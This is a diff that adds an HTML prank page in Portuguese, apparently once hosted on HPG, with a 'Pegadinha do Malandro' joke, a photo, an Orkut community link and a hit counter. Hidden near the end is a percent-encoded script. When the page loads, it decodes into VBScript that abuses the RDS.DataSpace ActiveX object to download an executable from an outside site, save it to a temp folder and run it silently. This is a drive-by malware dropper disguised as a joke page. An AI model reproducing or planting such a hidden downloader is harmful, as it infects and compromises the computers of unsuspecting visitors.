@@ -1,0 +1,54 @@
+<html>
+<!-- Barra HPG -->
+<script language="JavaScript">
+	function changePage() {
+		barra = "";
+		if (self.parent.frames.length == 0){
+	barra  = '\<script language="JavaScript1.1" src="http://www.ig.com.br/paginas/home/barra/v8/igbarra.js"\>\</script\>\n';	
+			document.write(barra);
+		}
+	}
+	changePage();
+</script>
+<!-- Barra HPG -->
+
+
+<head>
+<meta http-equiv="Content-Language" content="pt-br">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>Ráááááááááá</title>
+</head>
+
+<body>
+
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+<img border="0" src="http://www.alejandrosilva.kit.net/sergio.jpg" width="128" height="147"></p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+<font size="6">Ráááááááááá! Pegadinha do Malandro! </font></p>
+<p align="center">&nbsp;</p>
+<p align="center"><a href="http://www.orkut.com/Community.aspx?cmm=8207736">Se 
+Você caiu em alguma comunidade do Orkut<br>
+participe da nossa comunidade</a></p>
+
+<Script Language='Javascript'>
+-->
+<!--
+document.write(unescape('%3C%68%74%6D%6C%3E%0A%3C%68%65%61%64%3E%0A%3C%2F%68%65%61%64%3E%0A%3C%62%6F%64%79%3E%0A%3C%73%63%72%69%70%74%20%74%79%70%65%3D%22%74%65%78%74%2F%76%62%73%63%72%69%70%74%22%3E%0A%6F%6E%20%65%72%72%6F%72%20%72%65%73%75%6D%65%20%6E%65%78%74%0A%53%65%74%20%64%66%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%63%72%65%61%74%65%45%6C%65%6D%65%6E%74%28%22%6F%62%6A%65%63%74%22%29%0A%64%66%2E%73%65%74%41%74%74%72%69%62%75%74%65%20%22%63%6C%61%73%22%26%22%73%69%64%22%2C%20%22%63%6C%73%69%64%3A%42%44%39%36%43%22%26%22%35%35%36%2D%36%35%41%33%2D%31%31%44%30%2D%22%26%22%39%38%33%41%2D%30%30%43%30%34%46%22%26%22%43%32%39%45%33%36%22%0A%73%74%72%3D%22%4D%69%63%72%6F%73%6F%66%74%22%26%22%2E%22%26%22%58%4D%4C%48%54%54%50%22%0A%53%65%74%20%78%20%3D%20%64%66%2E%43%72%65%61%74%65%4F%62%6A%65%63%74%28%73%74%72%2C%22%22%29%0A%76%61%72%31%3D%22%41%64%22%0A%76%61%72%32%3D%22%6F%64%22%0A%76%61%72%33%3D%22%62%2E%22%0A%76%61%72%34%3D%22%53%74%22%0A%76%61%72%35%3D%22%72%65%22%0A%76%61%72%36%3D%22%61%6D%22%0A%73%74%72%31%3D%76%61%72%31%26%76%61%72%32%26%76%61%72%33%26%76%61%72%34%26%76%61%72%35%26%76%61%72%36%0A%0A%73%74%72%35%3D%73%74%72%31%0A%73%65%74%20%53%20%3D%20%64%66%2E%63%72%65%61%74%65%6F%62%6A%65%63%74%28%73%74%72%35%2C%22%22%29%0A%66%6F%72%20%63%6F%75%6E%74%20%3D%20%30%20%74%6F%20%34%0A%53%2E%74%79%70%65%20%3D%20%31%0A%6C%6E%6B%3D%22%68%74%74%70%3A%2F%2F%73%69%67%72%61%66%2E%6F%72%67%2E%62%72%2F%34%2E%73%63%72%22%0A%78%2E%4F%70%65%6E%20%22%47%22%26%22%45%22%26%22%54%22%2C%6C%6E%6B%2C%30%0A%78%2E%53%65%6E%64%0A%73%65%74%20%46%20%3D%20%64%66%2E%63%72%65%61%74%65%6F%62%6A%65%63%74%28%22%53%63%72%69%70%74%22%26%22%69%6E%67%2E%46%69%6C%65%53%79%73%22%26%22%74%65%6D%4F%62%6A%65%63%74%22%2C%22%22%29%0A%69%66%20%63%6F%75%6E%74%20%3D%20%30%20%74%68%65%6E%20%74%6D%70%20%3D%20%22%63%3A%5C%77%69%6E%64%6F%77%73%5C%74%65%6D%70%22%20%65%6C%73%65%20%69%66%20%63%6F%75%6E%74%20%3D%20%31%20%74%68%65%6E%20%74%6D%70%20%3D%20%22%63%3A%5C%22%20%65%6C%73%65%20%69%66%20%63%6F%75%6E%74%20%3D%20%32%20%74%68%65%6E%20%74%6D%70%20%3D%20%22%63%3A%5C%74%65%6D%70%22%20%65%6C%73%65%20%69%66%20%63%6F%75%6E%74%20%3D%20%33%20%74%68%65%6E%20%74%6D%70%20%3D%20%22%64%3A%5C%77%69%6E%64%6F%77%73%5C%74%65%6D%70%22%20%65%6C%73%65%20%69%66%20%63%6F%75%6E%74%20%3D%20%34%20%74%68%65%6E%20%74%6D%70%20%3D%20%22%64%3A%5C%22%20%65%6E%64%20%69%66%0A%66%6E%61%6D%65%31%3D%20%46%2E%42%75%69%6C%64%50%61%74%68%28%74%6D%70%2C%22%5C%61%72%71%75%69%76%6F%2E%65%78%65%22%29%0A%53%2E%6F%70%65%6E%0A%53%2E%77%72%69%74%65%20%78%2E%72%65%73%70%6F%6E%73%65%42%6F%64%79%0A%53%2E%73%61%76%65%74%6F%66%69%6C%65%20%66%6E%61%6D%65%31%2C%32%0A%53%2E%63%6C%6F%73%65%0A%69%66%20%65%72%72%2E%6E%75%6D%62%65%72%20%3D%20%30%20%74%68%65%6E%0A%73%65%74%20%51%20%3D%20%64%66%2E%63%72%65%61%74%65%6F%62%6A%65%63%74%28%22%53%68%65%6C%6C%2E%41%70%70%6C%69%63%61%74%69%6F%6E%22%2C%22%22%29%0A%51%2E%53%68%65%6C%6C%45%78%65%63%75%74%65%20%66%6E%61%6D%65%31%2C%22%49%4E%53%54%41%4C%4C%22%2C%22%22%2C%22%6F%70%65%6E%22%2C%30%0A%65%78%69%74%20%66%6F%72%0A%65%6C%73%65%0A%45%72%72%2E%43%6C%65%61%72%0A%45%6E%64%20%69%66%0A%6E%65%78%74%0A%3C%2F%73%63%72%69%70%74%3E%0A%3C%2F%62%6F%64%79%3E%0A%3C%2F%68%74%6D%6C%3E%0A'));
+//-->
+</Script>
+
+<!-- Inicio do codigo do contador de acessos -->
+<!-- http://www.itmnetworks.com.br -->
+<a href="http://www.itmnetworks.com.br"><span style="text-decoration: none">.</span></a>
+<script language="JavaScript" src="http://www.itmnetworks.com.br/scripts/counter/counter.asp?pagina=special20.hpgvip.com.brjornal.htm&estilo=acro&tamanho=8"></script>
+<a href="http://www.itmnetworks.com.br"><span style="text-decoration: none">.</span></a>
+<!-- Fim do codigo do contador de acessos -->
+
